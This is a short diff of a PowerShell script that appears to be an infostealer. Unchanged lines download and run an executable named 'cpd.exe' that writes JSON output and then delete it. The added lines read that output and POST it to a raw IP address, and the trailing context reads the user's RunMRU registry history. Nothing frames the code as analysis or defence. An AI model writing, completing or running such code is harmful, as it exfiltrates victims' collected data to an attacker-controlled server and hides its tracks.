@@ -6,10 +6,9 @@ Invoke-WebRequest -Uri $url -OutFile "cpd.exe";
 $cmd = ".\cpd.exe -f json x";
 Invoke-Expression $cmd;
 Remove-Item ".\cpd.exe";
-Set-ItemProperty -Path .\x.json -Name attributes -Value 6;
-# send
-Set-ItemProperty -Path .\x.json -Name attributes -Value 0;
+$data = (Get-Content ".\x.json");
 Remove-Item ".\x.json";
+Invoke-WebRequest -Uri "http://3.92.185.85/" -Method POST -Body $data;
 
 $path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU";
 $arr = Get-ItemPropertyValue $path -Name MRUList;
